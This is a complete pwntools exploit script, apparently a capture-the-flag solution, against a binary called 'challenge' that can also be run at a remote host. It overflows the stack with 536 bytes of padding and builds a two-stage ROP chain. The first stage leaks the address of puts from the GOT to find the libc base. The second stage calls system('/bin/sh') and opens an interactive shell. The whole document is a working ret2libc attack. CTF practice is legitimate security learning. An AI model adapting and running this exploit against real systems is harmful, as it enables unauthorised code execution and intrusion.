#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    con = remote('overly.uniquename.xyz', 2052)
else:
    con = process('./challenge', env={"LD_PRELOAD" : "./lib/x86_64-linux-gnu/libc-2.31.so"})

padding = b'A' * 536

ret     = 0x40101a
pop_rdi = 0x401313

# Stage 1
main     = 0x401293
puts_plt = 0x4010a0
puts_got = 0x404020

# Leak address of puts in libc
stage_1_payload = flat(
        padding,
        pop_rdi,
        puts_got,
        puts_plt,
        main,
)

con.sendline(stage_1_payload)

con.recvline()
con.recvline()
con.recvline()
puts = u64(con.recvline().strip().ljust(8, b'\x00'))

puts_libc = 0x0875a0
libc_base = puts - puts_libc

# Stage 2
system = libc_base + 0x055410
binsh  = libc_base + 0x1b75aa
exit   = libc_base + 0x049bc0

# Execute system("/bin/sh")
stage_2_payload = flat(
        padding,
        ret,
        pop_rdi,
        binsh,
        system,
        exit,
)

con.sendline(stage_2_payload)

con.interactive()

